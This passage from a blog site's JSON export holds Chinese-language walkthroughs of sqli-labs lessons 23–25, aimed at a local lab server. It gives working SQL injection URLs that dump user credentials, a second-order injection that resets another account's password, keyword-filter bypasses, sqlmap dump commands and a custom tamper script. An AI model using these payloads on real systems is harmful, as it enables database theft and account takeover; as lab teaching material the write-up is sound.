'1'='1`\n\n![005](/img/sql/Lesson-23/005.png)\n\n### 获取当前数据库\n\n`http://192.168.75.131/sql/Less-23/?id=-1' union select 1,(select database()),3 or '1'='1`\n\n![006](/img/sql/Lesson-23/006.png)\n\n### 获取表名\n\n`http://192.168.75.131/sql/Less-23/?id=-1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 or '1'='1`\n\n![007](/img/sql/Lesson-23/007.png)\n\n### 获取列名\n\n`http://192.168.75.131/sql/Less-23/?id=-1' union select 1,(select group_concat(column_name) from information_schema.columns where table_name='users'),3 or '1'='1`\n\n![008](/img/sql/Lesson-23/008.png)\n\n### 获取字段值\n\n`http://192.168.75.131/sql/Less-23/?id=-1' union select 1,(select group_concat(id,'~',username,'~',password) from security.users),3 or '1'='1`\n\n![009](/img/sql/Lesson-23/009.png)\n\n## SQLMAP\n\n`python sqlmap.py -u \"http://192.168.75.131/sql/Less-23/?id=-1' or '1'='1 \" --dbms mysql --threads 10 --method GET --technique B `\n\n![010](/img/sql/Lesson-23/010.png)\n\n`python sqlmap.py -u \"http://192.168.75.131/sql/Less-23/?id=1\" --threads 10 -D security -T users --columns --dump`\n\n![011](/img/sql/Lesson-23/011.png)\n\n","source":"_posts/sqli-labs-lession-23-GET基于错误的过滤注释.md","raw":"---\ntitle: sqli-labs lession 23 GET基于错误的过滤注释\ndate: 2018-10-03 13:05:05\ntags: [sqli-labs]\ncategories: sql注入\n---\n\n# sqli-labs lession 23 GET基于错误的过滤注释\n\n---\n\n## 登录界面\n\n![001](/img/sql/Lesson-23/001.png)\n\n## 分析\n\n这里对输入的`#`和`-- `的mysql注释方式进行了过滤。都替换成了空。\n\n![002](/img/sql/Lesson-23/002.png)\n\n用`'`发现报错,但是因为过滤了`#`和`-- `只能使用闭合绕过了。\n\n![003](/img/sql/Lesson-23/003.png)\n\n`http://192.168.75.131/sql/Less-23/?id=1' or '1'='1`\n\n![004](/img/sql/Lesson-23/004.png)\n\n## 手注\n\n### 获取字段数\n\n`http://192.168.75.131/sql/Less-23/?id=1' union select null,null,null or '1'='1`\n\n![005](/img/sql/Lesson-23/005.png)\n\n### 获取当前数据库\n\n`http://192.168.75.131/sql/Less-23/?id=-1' union select 1,(select database()),3 or '1'='1`\n\n![006](/img/sql/Lesson-23/006.png)\n\n### 获取表名\n\n`http://192.168.75.131/sql/Less-23/?id=-1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 or '1'='1`\n\n![007](/img/sql/Lesson-23/007.png)\n\n### 获取列名\n\n`http://192.168.75.131/sql/Less-23/?id=-1' union select 1,(select group_concat(column_name) from information_schema.columns where table_name='users'),3 or '1'='1`\n\n![008](/img/sql/Lesson-23/008.png)\n\n### 获取字段值\n\n`http://192.168.75.131/sql/Less-23/?id=-1' union select 1,(select group_concat(id,'~',username,'~',password) from security.users),3 or '1'='1`\n\n![009](/img/sql/Lesson-23/009.png)\n\n## SQLMAP\n\n`python sqlmap.py -u \"http://192.168.75.131/sql/Less-23/?id=-1' or '1'='1 \" --dbms mysql --threads 10 --method GET --technique B `\n\n![010](/img/sql/Lesson-23/010.png)\n\n`python sqlmap.py -u \"http://192.168.75.131/sql/Less-23/?id=1\" --threads 10 -D security -T users --columns --dump`\n\n![011](/img/sql/Lesson-23/011.png)\n\n","slug":"sqli-labs-lession-23-GET基于错误的过滤注释","published":1,"updated":"2019-06-19T17:23:13.388Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istd7002u4dsb63d3pdyw","content":"<h1 id=\"sqli-labs-lession-23-GET基于错误的过滤注释\"><a href=\"#sqli-labs-lession-23-GET基于错误的过滤注释\" class=\"headerlink\" title=\"sqli-labs lession 23 GET基于错误的过滤注释\"></a>sqli-labs lession 23 GET基于错误的过滤注释</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-23/001.png\" alt=\"001\"></p>\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><p>这里对输入的<code>#</code>和<code>--</code>的mysql注释方式进行了过滤。都替换成了空。</p>\n<p><img src=\"/img/sql/Lesson-23/002.png\" alt=\"002\"></p>\n<p>用<code>&#39;</code>发现报错,但是因为过滤了<code>#</code>和<code>--</code>只能使用闭合绕过了。</p>\n<p><img src=\"/img/sql/Lesson-23/003.png\" alt=\"003\"></p>\n<p><code>http://192.168.75.131/sql/Less-23/?id=1&#39; or &#39;1&#39;=&#39;1</code></p>\n<p><img src=\"/img/sql/Lesson-23/004.png\" alt=\"004\"></p>\n<h2 id=\"手注\"><a href=\"#手注\" class=\"headerlink\" title=\"手注\"></a>手注</h2><h3 id=\"获取字段数\"><a href=\"#获取字段数\" class=\"headerlink\" title=\"获取字段数\"></a>获取字段数</h3><p><code>http://192.168.75.131/sql/Less-23/?id=1&#39; union select null,null,null or &#39;1&#39;=&#39;1</code></p>\n<p><img src=\"/img/sql/Lesson-23/005.png\" alt=\"005\"></p>\n<h3 id=\"获取当前数据库\"><a href=\"#获取当前数据库\" class=\"headerlink\" title=\"获取当前数据库\"></a>获取当前数据库</h3><p><code>http://192.168.75.131/sql/Less-23/?id=-1&#39; union select 1,(select database()),3 or &#39;1&#39;=&#39;1</code></p>\n<p><img src=\"/img/sql/Lesson-23/006.png\" alt=\"006\"></p>\n<h3 id=\"获取表名\"><a href=\"#获取表名\" class=\"headerlink\" title=\"获取表名\"></a>获取表名</h3><p><code>http://192.168.75.131/sql/Less-23/?id=-1&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),3 or &#39;1&#39;=&#39;1</code></p>\n<p><img src=\"/img/sql/Lesson-23/007.png\" alt=\"007\"></p>\n<h3 id=\"获取列名\"><a href=\"#获取列名\" class=\"headerlink\" title=\"获取列名\"></a>获取列名</h3><p><code>http://192.168.75.131/sql/Less-23/?id=-1&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;),3 or &#39;1&#39;=&#39;1</code></p>\n<p><img src=\"/img/sql/Lesson-23/008.png\" alt=\"008\"></p>\n<h3 id=\"获取字段值\"><a href=\"#获取字段值\" class=\"headerlink\" title=\"获取字段值\"></a>获取字段值</h3><p><code>http://192.168.75.131/sql/Less-23/?id=-1&#39; union select 1,(select group_concat(id,&#39;~&#39;,username,&#39;~&#39;,password) from security.users),3 or &#39;1&#39;=&#39;1</code></p>\n<p><img src=\"/img/sql/Lesson-23/009.png\" alt=\"009\"></p>\n<h2 id=\"SQLMAP\"><a href=\"#SQLMAP\" class=\"headerlink\" title=\"SQLMAP\"></a>SQLMAP</h2><p><code>python sqlmap.py -u &quot;http://192.168.75.131/sql/Less-23/?id=-1&#39; or &#39;1&#39;=&#39;1 &quot; --dbms mysql --threads 10 --method GET --technique B</code></p>\n<p><img src=\"/img/sql/Lesson-23/010.png\" alt=\"010\"></p>\n<p><code>python sqlmap.py -u &quot;http://192.168.75.131/sql/Less-23/?id=1&quot; --threads 10 -D security -T users --columns --dump</code></p>\n<p><img src=\"/img/sql/Lesson-23/011.png\" alt=\"011\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"sqli-labs-lession-23-GET基于错误的过滤注释\"><a href=\"#sqli-labs-lession-23-GET基于错误的过滤注释\" class=\"headerlink\" title=\"sqli-labs lession 23 GET基于错误的过滤注释\"></a>sqli-labs lession 23 GET基于错误的过滤注释</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-23/001.png\" alt=\"001\"></p>\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><p>这里对输入的<code>#</code>和<code>--</code>的mysql注释方式进行了过滤。都替换成了空。</p>\n<p><img src=\"/img/sql/Lesson-23/002.png\" alt=\"002\"></p>\n<p>用<code>&#39;</code>发现报错,但是因为过滤了<code>#</code>和<code>--</code>只能使用闭合绕过了。</p>\n<p><img src=\"/img/sql/Lesson-23/003.png\" alt=\"003\"></p>\n<p><code>http://192.168.75.131/sql/Less-23/?id=1&#39; or &#39;1&#39;=&#39;1</code></p>\n<p><img src=\"/img/sql/Lesson-23/004.png\" alt=\"004\"></p>\n<h2 id=\"手注\"><a href=\"#手注\" class=\"headerlink\" title=\"手注\"></a>手注</h2><h3 id=\"获取字段数\"><a href=\"#获取字段数\" class=\"headerlink\" title=\"获取字段数\"></a>获取字段数</h3><p><code>http://192.168.75.131/sql/Less-23/?id=1&#39; union select null,null,null or &#39;1&#39;=&#39;1</code></p>\n<p><img src=\"/img/sql/Lesson-23/005.png\" alt=\"005\"></p>\n<h3 id=\"获取当前数据库\"><a href=\"#获取当前数据库\" class=\"headerlink\" title=\"获取当前数据库\"></a>获取当前数据库</h3><p><code>http://192.168.75.131/sql/Less-23/?id=-1&#39; union select 1,(select database()),3 or &#39;1&#39;=&#39;1</code></p>\n<p><img src=\"/img/sql/Lesson-23/006.png\" alt=\"006\"></p>\n<h3 id=\"获取表名\"><a href=\"#获取表名\" class=\"headerlink\" title=\"获取表名\"></a>获取表名</h3><p><code>http://192.168.75.131/sql/Less-23/?id=-1&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),3 or &#39;1&#39;=&#39;1</code></p>\n<p><img src=\"/img/sql/Lesson-23/007.png\" alt=\"007\"></p>\n<h3 id=\"获取列名\"><a href=\"#获取列名\" class=\"headerlink\" title=\"获取列名\"></a>获取列名</h3><p><code>http://192.168.75.131/sql/Less-23/?id=-1&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;),3 or &#39;1&#39;=&#39;1</code></p>\n<p><img src=\"/img/sql/Lesson-23/008.png\" alt=\"008\"></p>\n<h3 id=\"获取字段值\"><a href=\"#获取字段值\" class=\"headerlink\" title=\"获取字段值\"></a>获取字段值</h3><p><code>http://192.168.75.131/sql/Less-23/?id=-1&#39; union select 1,(select group_concat(id,&#39;~&#39;,username,&#39;~&#39;,password) from security.users),3 or &#39;1&#39;=&#39;1</code></p>\n<p><img src=\"/img/sql/Lesson-23/009.png\" alt=\"009\"></p>\n<h2 id=\"SQLMAP\"><a href=\"#SQLMAP\" class=\"headerlink\" title=\"SQLMAP\"></a>SQLMAP</h2><p><code>python sqlmap.py -u &quot;http://192.168.75.131/sql/Less-23/?id=-1&#39; or &#39;1&#39;=&#39;1 &quot; --dbms mysql --threads 10 --method GET --technique B</code></p>\n<p><img src=\"/img/sql/Lesson-23/010.png\" alt=\"010\"></p>\n<p><code>python sqlmap.py -u &quot;http://192.168.75.131/sql/Less-23/?id=1&quot; --threads 10 -D security -T users --columns --dump</code></p>\n<p><img src=\"/img/sql/Lesson-23/011.png\" alt=\"011\"></p>\n"},{"title":"sqli-labs lession-24 POST二次排序注入-存储型注入","date":"2018-10-03T11:25:09.000Z","_content":"\n# sqli-labs lession-24 POST二次排序注入-存储型注入\n\n---\n\n## 登录界面\n\n![001](/img/sql/Lesson-24/001.png)\n\n## 分析\n\n主要有3个php文件:`login.php`负责查询数据库用户存在和验证登录,`login_create.php`创建新用户,`pass_change.php`修改老用户密码。\n\n![002](/img/sql/Lesson-24/002.png)\n\n本次的过滤在账户登录和密码处,使用了`mysql_escape_string`函数\n\nNote: mysql_escape_string() 并不转义 % 和 _。\n\n输入的特殊字符会被它转义而不奏效,但是之后存储进数据库时依然会还原成原来的样子。\n\n经过代码审计发现`pass_change.php`中直接把session中的用户名直接拿来用了,结合上面的过滤函数,如果知道切确的用户,可以构造单引号闭合来修改其密码。\n\n![003](/img/sql/Lesson-24/003.png)\n\n假如知道了个用户`Dumb`,可以创建一个新用户`Dumb'#`来修改用户`Dumb`密码。\n\n可以看见我已经创建了`Dumb'#`用户。\n\n![004](/img/sql/Lesson-24/004.png)\n\n用该用户进入修改密码的界面修改密码。\n\n![005](/img/sql/Lesson-24/005.png)\n\n可以发现确实把密码改了。\n\n![006](/img/sql/Lesson-24/006.png)\n\n这里下面没有报错的地方,没有办法利用报错注入,利用时间注入的话需要的语句很长,这里的数据库账户长度只支持到20个字符,感觉只能到此为止了。如果这里的字符长度允许的话,可以构造类似`admin' and if(8=(length(database())),sleep(60),null)#`的SQL语句来注入。\n\n但是本课的思想已经体会到了:\n\n对于存储型的注入,可以先将导致SQL注入的字符预先存到数据库中,当再次调用到这个恶意构造的字符时就可以触发注入。","source":"_posts/sqli-labs-lession-24-POST二次排序注入-存储型注入.md","raw":"---\ntitle: sqli-labs lession-24 POST二次排序注入-存储型注入\ndate: 2018-10-03 19:25:09\ntags: [sqli-labs]\ncategories: sql注入\n---\n\n# sqli-labs lession-24 POST二次排序注入-存储型注入\n\n---\n\n## 登录界面\n\n![001](/img/sql/Lesson-24/001.png)\n\n## 分析\n\n主要有3个php文件:`login.php`负责查询数据库用户存在和验证登录,`login_create.php`创建新用户,`pass_change.php`修改老用户密码。\n\n![002](/img/sql/Lesson-24/002.png)\n\n本次的过滤在账户登录和密码处,使用了`mysql_escape_string`函数\n\nNote: mysql_escape_string() 并不转义 % 和 _。\n\n输入的特殊字符会被它转义而不奏效,但是之后存储进数据库时依然会还原成原来的样子。\n\n经过代码审计发现`pass_change.php`中直接把session中的用户名直接拿来用了,结合上面的过滤函数,如果知道切确的用户,可以构造单引号闭合来修改其密码。\n\n![003](/img/sql/Lesson-24/003.png)\n\n假如知道了个用户`Dumb`,可以创建一个新用户`Dumb'#`来修改用户`Dumb`密码。\n\n可以看见我已经创建了`Dumb'#`用户。\n\n![004](/img/sql/Lesson-24/004.png)\n\n用该用户进入修改密码的界面修改密码。\n\n![005](/img/sql/Lesson-24/005.png)\n\n可以发现确实把密码改了。\n\n![006](/img/sql/Lesson-24/006.png)\n\n这里下面没有报错的地方,没有办法利用报错注入,利用时间注入的话需要的语句很长,这里的数据库账户长度只支持到20个字符,感觉只能到此为止了。如果这里的字符长度允许的话,可以构造类似`admin' and if(8=(length(database())),sleep(60),null)#`的SQL语句来注入。\n\n但是本课的思想已经体会到了:\n\n对于存储型的注入,可以先将导致SQL注入的字符预先存到数据库中,当再次调用到这个恶意构造的字符时就可以触发注入。","slug":"sqli-labs-lession-24-POST二次排序注入-存储型注入","published":1,"updated":"2019-06-19T17:23:13.388Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istd8002w4dsb88fgww8s","content":"<h1 id=\"sqli-labs-lession-24-POST二次排序注入-存储型注入\"><a href=\"#sqli-labs-lession-24-POST二次排序注入-存储型注入\" class=\"headerlink\" title=\"sqli-labs lession-24 POST二次排序注入-存储型注入\"></a>sqli-labs lession-24 POST二次排序注入-存储型注入</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-24/001.png\" alt=\"001\"></p>\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><p>主要有3个php文件:<code>login.php</code>负责查询数据库用户存在和验证登录,<code>login_create.php</code>创建新用户,<code>pass_change.php</code>修改老用户密码。</p>\n<p><img src=\"/img/sql/Lesson-24/002.png\" alt=\"002\"></p>\n<p>本次的过滤在账户登录和密码处,使用了<code>mysql_escape_string</code>函数</p>\n<p>Note: mysql_escape_string() 并不转义 % 和 _。</p>\n<p>输入的特殊字符会被它转义而不奏效,但是之后存储进数据库时依然会还原成原来的样子。</p>\n<p>经过代码审计发现<code>pass_change.php</code>中直接把session中的用户名直接拿来用了,结合上面的过滤函数,如果知道切确的用户,可以构造单引号闭合来修改其密码。</p>\n<p><img src=\"/img/sql/Lesson-24/003.png\" alt=\"003\"></p>\n<p>假如知道了个用户<code>Dumb</code>,可以创建一个新用户<code>Dumb&#39;#</code>来修改用户<code>Dumb</code>密码。</p>\n<p>可以看见我已经创建了<code>Dumb&#39;#</code>用户。</p>\n<p><img src=\"/img/sql/Lesson-24/004.png\" alt=\"004\"></p>\n<p>用该用户进入修改密码的界面修改密码。</p>\n<p><img src=\"/img/sql/Lesson-24/005.png\" alt=\"005\"></p>\n<p>可以发现确实把密码改了。</p>\n<p><img src=\"/img/sql/Lesson-24/006.png\" alt=\"006\"></p>\n<p>这里下面没有报错的地方,没有办法利用报错注入,利用时间注入的话需要的语句很长,这里的数据库账户长度只支持到20个字符,感觉只能到此为止了。如果这里的字符长度允许的话,可以构造类似<code>admin&#39; and if(8=(length(database())),sleep(60),null)#</code>的SQL语句来注入。</p>\n<p>但是本课的思想已经体会到了:</p>\n<p>对于存储型的注入,可以先将导致SQL注入的字符预先存到数据库中,当再次调用到这个恶意构造的字符时就可以触发注入。</p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"sqli-labs-lession-24-POST二次排序注入-存储型注入\"><a href=\"#sqli-labs-lession-24-POST二次排序注入-存储型注入\" class=\"headerlink\" title=\"sqli-labs lession-24 POST二次排序注入-存储型注入\"></a>sqli-labs lession-24 POST二次排序注入-存储型注入</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-24/001.png\" alt=\"001\"></p>\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><p>主要有3个php文件:<code>login.php</code>负责查询数据库用户存在和验证登录,<code>login_create.php</code>创建新用户,<code>pass_change.php</code>修改老用户密码。</p>\n<p><img src=\"/img/sql/Lesson-24/002.png\" alt=\"002\"></p>\n<p>本次的过滤在账户登录和密码处,使用了<code>mysql_escape_string</code>函数</p>\n<p>Note: mysql_escape_string() 并不转义 % 和 _。</p>\n<p>输入的特殊字符会被它转义而不奏效,但是之后存储进数据库时依然会还原成原来的样子。</p>\n<p>经过代码审计发现<code>pass_change.php</code>中直接把session中的用户名直接拿来用了,结合上面的过滤函数,如果知道切确的用户,可以构造单引号闭合来修改其密码。</p>\n<p><img src=\"/img/sql/Lesson-24/003.png\" alt=\"003\"></p>\n<p>假如知道了个用户<code>Dumb</code>,可以创建一个新用户<code>Dumb&#39;#</code>来修改用户<code>Dumb</code>密码。</p>\n<p>可以看见我已经创建了<code>Dumb&#39;#</code>用户。</p>\n<p><img src=\"/img/sql/Lesson-24/004.png\" alt=\"004\"></p>\n<p>用该用户进入修改密码的界面修改密码。</p>\n<p><img src=\"/img/sql/Lesson-24/005.png\" alt=\"005\"></p>\n<p>可以发现确实把密码改了。</p>\n<p><img src=\"/img/sql/Lesson-24/006.png\" alt=\"006\"></p>\n<p>这里下面没有报错的地方,没有办法利用报错注入,利用时间注入的话需要的语句很长,这里的数据库账户长度只支持到20个字符,感觉只能到此为止了。如果这里的字符长度允许的话,可以构造类似<code>admin&#39; and if(8=(length(database())),sleep(60),null)#</code>的SQL语句来注入。</p>\n<p>但是本课的思想已经体会到了:</p>\n<p>对于存储型的注入,可以先将导致SQL注入的字符预先存到数据库中,当再次调用到这个恶意构造的字符时就可以触发注入。</p>\n"},{"title":"sqli-labs lession 25 基于错误的GET单引号-你的OR及AND归我所有","date":"2018-10-03T15:09:30.000Z","_content":"\n# sqli-labs lession 25 基于错误的GET单引号-你的OR及AND归我所有\n\n---\n\n## 登录界面\n\n![001](/img/sql/Lesson-25/001.png)\n\n## 分析\n\n从以下源码可以看出对or和and无论大小写都进行用空屁替代。\n\n```\nfunction blacklist($id)\n{\n\t$id= preg_replace('/or/i',\"\", $id);\t\t\t//strip out OR (non case sensitive)\n\t$id= preg_replace('/AND/i',\"\", $id);\t\t//Strip out AND (non case sensitive)\n\t\n\treturn $id;\n}\n```\n\n这里就是考的就是绕过姿势了。\n\n1.数学符号\n\nand = && or = ||\n\n`&`对应url编码`%26`,`|`对应url编码`%7c`。\n\n`http://192.168.75.131/sql/Less-25/?id=1' %26%26 extractvalue(null,concat(0x7e,database(),0x7e))%23`\n\n![002](/img/sql/Lesson-25/002.png)\n\n`http://192.168.75.131/sql/Less-25/?id=1' %7c%7c extractvalue(null,concat(0x7e,database(),0x7e))%23`\n\n![003](/img/sql/Lesson-25/003.png)\n\n2.双写绕过\n\n类似与`aandnd`和`oorr`\n\n`http://192.168.75.131/sql/Less-25/?id=1' aandnd extractvalue(null,concat(0x7e,database(),0x7e))%23`\n\n![004](/img/sql/Lesson-25/004.png)\n\n`http://192.168.75.131/sql/Less-25/?id=1' oorr extractvalue(null,concat(0x7e,database(),0x7e))%23`\n\n![005](/img/sql/Lesson-25/005.png)\n\n## SQLMAP\n\n最开始考虑使用的是symboliclogical.py脚本,这个脚本能用 && 替换 and ，用 || 替换 or，但是实际使用的时候遇到了麻烦,因为后续的Payload用到了information来设置payload,而information的会被过滤成infmation,这样SQLMAP就没法获得数据了。\n\n`python sqlmap.py -u \"http://192.168.75.131/sql/Less-25/?id=1\" --tamper \"symboliclogical.py\" --technique E --dbms mysql --flush-session --fresh-queries --dbs -v 3`\n\n![006](/img/sql/Lesson-25/006.png)\n\n从上图的WARNING发现没有获取到数据,把payload复制下来跑下看看。\n\n可以发现把information的or过滤了。\n\n![007](/img/sql/Lesson-25/007.png)\n\n修改脚本如下,另存一个脚本为`andor.py`\n\n`retVal = re.sub(r\"(?i)(and)\", r\"anandd\", re.sub(r\"(?i)(or)\", \"oorr\", payload))`\n\n这个用的是双写绕过and和or,而且information会被替换为infoormation\n\n![008](/img/sql/Lesson-25/008.png)\n\n```\n#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2018 sqlmap developers (http://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport re\n\nfrom lib.core.enums import PRIORITY\n\n__priority__ = PRIORITY.NORMAL\n\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Add an inline comment (/**/) to the end of all occurrences of (MySQL) \"information_schema\" identifier\n\n    >>> tamper('and or')\n    'anandd oorr'\n    \"\"\"\n\n    retVal = payload\n\n    if payload:\n        retVal = re.sub(r\"(?i)(and)\", r\"anandd\", re.sub(r\"(?i)(or)\", \"oorr\", payload))\n\n    return retVal\n```\n\n`python sqlmap.py -u \"http://192.168.75.131/sql/Less-25/?id=1\" --tamper \"andor.py\" --technique E --dbms mysql --flush-session --fresh-queries --threads 10 --dbs`\n\n![009](/img/sql/Lesson-25/009.png)\n\n接下来都一样了。\n\n`python sqlmap.py -u \"http://192.168.75.131/sql/Less-25/?id=1\" --tamper \"andor.py\" --technique E --dbms mysql  --threads 10 -D security -T users --columns --dump`\n\n![010](/img/sql/Lesson-25/010.png)\n\n\n","source":"_posts/sqli-labs-lession-25-基于错误的GET单引号-你的OR及AND归我所有.md","raw":"---\ntitle: sqli-labs lession 25 基于错误的GET单引号-你的OR及AND归我所有\ndate: 2018-10-03 23:09:30\ntags: [sqli-labs]\ncategories: sql注入\n---\n\n# sqli-labs lession 25 基于错误的GET单引号-你的OR及AND归我所有\n\n---\n\n## 登录界面\n\n![001](/img/sql/Lesson-25/001.png)\n\n## 分析\n\n从以下源码可以看出对or和and无论大小写都进行用空屁替代。\n\n```\nfunction blacklist($id)\n{\n\t$id= preg_replace('/or/i',\"\", $id);\t\t\t//strip out OR (non case sensitive)\n\t$id= preg_replace('/AND/i',\"\", $id);\t\t//Strip out AND (non case sensitive)\n\t\n\treturn $id;\n}\n```\n\n这里就是考的就是绕过姿势了。\n\n1.数学符号\n\nand = && or = ||\n\n`&`对应url编码`%26`,`|`对应url编码`%7c`。\n\n`http://192.168.75.131/sql/Less-25/?id=1' %26%26 extractvalue(null,concat(0x7e,database(),0x7e))%23`\n\n![002](/img/sql/Lesson-25/002.png)\n\n`http://192.168.75.131/sql/Less-25/?id=1' %7c%7c extractvalue(null,concat(0x7e,database(),0x7e))%23`\n\n![003](/img/sql/Lesson-25/003.png)\n\n2.双写绕过\n\n类似与`aandnd`和`oorr`\n\n`http://192.168.75.131/sql/Less-25/?id=1' aandnd extractvalue(null,concat(0x7e,database(),0x7e))%23`\n\n![004](/img/sql/Lesson-25/004.png)\n\n`http://192.168.75.131/sql/Less-25/?id=1' oorr extractvalue(null,concat(0x7e,database(),0x7e))%23`\n\n![005](/img/sql/Lesson-25/005.png)\n\n## SQLMAP\n\n最开始考虑使用的是symboliclogical.py脚本,这个脚本能用 && 替换 and ，用 || 替换 or，但是实际使用的时候遇到了麻烦,因为后续的Payload用到了information来设置payload,而information的会被过滤成infmation,这样SQLMAP就没法获得数据了。\n\n`python sqlmap.py -u \"http://192.168.75.131/sql/Less-25/?id=1\" --tamper \"symboliclogical.py\" --technique E --dbms mysql --flush-session --fresh-queries --dbs -v 3`\n\n![006](/img/sql/Lesson-25/006.png)\n\n从上图的WARNING发现没有获取到数据,把payload复制下来跑下看看。\n\n可以发现把information的or过滤了。\n\n![007](/img/sql/Lesson-25/007.png)\n\n修改脚本如下,另存一个脚本为`andor.py`\n\n`retVal = re.sub(r\"(?i)(and)\", r\"anandd\", re.sub(r\"(?i)(or)\", \"oorr\", payload))`\n\n这个用的是双写绕过and和or,而且information会被替换为infoormation\n\n![008](/img/sql/Lesson-25/008.png)\n\n```\n#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2018 sqlmap developers (http://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport re\n\nfrom lib.core.enums import PRIORITY\n\n__priority__ = PRIORITY.NORMAL\n\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Add an inline comment (/**/) to the end of all occurrences of (MySQL) \"information_schema\" identifier\n\n    >>> tamper('and or')\n    'anandd oorr'\n    \"\"\"\n\n    retVal = payload\n\n    if payload:\n        retVal = re.sub(r\"(?i)(and)\", r\"anandd\", re.sub(r\"(?i)(or)\", \"oorr\", payload))\n\n    return retVal\n```\n\n`python sqlmap.py -u \"http://192.168.75.131/sql/Less-25/?id=1\" --tamper \"andor.py\" --technique E --dbms mysql --flush-session --fresh-queries --threads 10 --dbs`\n\n![009](/img/sql/Lesson-25/009.png)\n\n接下来都一样了。\n\n`python sqlmap.py -u \"http://192.168.75.131/sql/Less-25/?id=1\" --tamper \"andor.py\" --technique E --dbms mysql  --threads 10 -D security -T users --columns --dump`\n\n![010](/img/sql/Lesson-25/010.png)\n\n\n","slug":"sqli-labs-lession-25-基于错误的GET单引号-你的OR及AND归我所有","published":1,"updated":"2019-06-19T17:23:13.388Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istda00304dsbijyjilab","content":"<h1 id=\"sqli-labs-lession-25-基于错误的GET单引号-你的OR及AND归我所有\"><a href=\"#sqli-labs-lession-25-基于错误的GET单引号-你的OR及AND归我所有\" class=\"headerlink\" title=\"sqli-labs lession 25 基于错误的GET单引号-你的OR及AND归我所有\"></a>sqli-labs lession 25 基于错误的GET单引号-你的OR及AND归我所有</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-25/001.png\" alt=\"001\"></p>\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><p>从以下源码可以看出对or和and无论大小写都进行用空屁替代。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">blacklist</span><span class=\"params\">($id)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t$id= preg_replace(<span class=\"string\">'/or/i'</span>,<span class=\"string\">\"\"</span>, $id);\t\t\t<span class=\"comment\">//strip out OR (non case sensitive)</span></span><br><span class=\"line\">\t$id= preg_replace(<span class=\"string\">'/AND/i'</span>,<span class=\"string\">\"\"</span>, $id);\t\t<span class=\"comment\">//Strip out AND (non case sensitive)</span></span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> $id;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这里就是考的就是绕过姿势了。</p>\n<p>1.数学符号</p>\n<p>and = &amp;&amp; or = ||</p>\n<p><code>&amp;</code>对应url编码<code>%26</code>,<code>|</code>对应url编码<code>%7c</code>。</p>\n<p><code>http://192.168.75.131/sql/Less-25/?id=1&#39; %26%26 extractvalue(null,concat(0x7e,database(),0x7e))%23</code></p>\n<p><img src=\"/img/sql/Lesson-25/002.png\" alt=\"002\"></p>\n<p><code>http://192.168.75.131/sql/Less-25/?id=1&#39; %7c%7c extractvalue(null,concat(0x7e,database(),0x7e))%23</code></p>\n<p><img src=\"/img/sql/Lesson-25/003.png\" alt=\"003\"></p>\n<p>2.双写绕过</p>\n<p>类似与<code>aandnd</code>和<code>oorr</code></p>\n<p><code>http://192.168.75.131/sql/Less-25/?id=1&#39; aandnd extractvalue(null,concat(0x7e,database(),0x7e))%23</code></p>\n<p><img src=\"/img/sql/Lesson-25/004.png\" alt=\"004\"></p>\n<p><code>http://192.168.75.131/sql/Less-25/?id=1&#39; oorr extractvalue(null,concat(0x7e,database(),0x7e))%23</code></p>\n<p><img src=\"/img/sql/Lesson-25/005.png\" alt=\"005\"></p>\n<h2 id=\"SQLMAP\"><a href=\"#SQLMAP\" class=\"headerlink\" title=\"SQLMAP\"></a>SQLMAP</h2><p>最开始考虑使用的是symboliclogical.py脚本,这个脚本能用 &amp;&amp; 替换 and ，用 || 替换 